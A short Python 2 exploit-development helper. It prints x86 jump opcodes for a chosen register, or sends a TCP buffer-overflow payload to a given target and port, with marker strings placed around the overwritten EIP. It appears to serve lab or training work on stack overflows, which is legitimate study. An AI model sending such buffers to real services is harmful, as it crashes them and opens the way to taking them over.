#!/usr/bin/python

import socket
import time
import sys

jump = {"eax":"\\xff\\xe0","ebx":"\\xff\\xe3","ecx":"\\xff\\xe1","edx":"\\xff\\xe2","ebp":"\\xff\\xe5","esp":"\\xff\\xe4","esi":"\\xff\\xe6","edi":"\\xff\\xe7"}

if len(sys.argv) == 2:
    register = sys.argv[1]
    register = register.lower()
    print jump[register]
    exit(0)

elif len(sys.argv) < 4:
    print("usage: \"python space.py [target] [port] [eip]\"")
    print("usage: \"can also be used to find jump opcodes with \"python space.py [register name]\"")
    exit(0)

target = sys.argv[1]
port = int(sys.argv[2])
eip = int(sys.argv[3])

if len(sys.argv) == 5:
    cmd = sys.argv[4] + " "
else:
    cmd = ""

cmd = cmd.lstrip(" ")

herring = "This is the beginning"
herring2 = "This is right before the EIP" 
herring3 = "This is right after the EIP"

inputBuffer = cmd + herring + "A" * (eip - len(herring) - len(herring2)) + herring2 + "B" * 4 + herring3
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,port))
print("sending buffer")
s.send(inputBuffer)
s.recv(1024)
s.close()
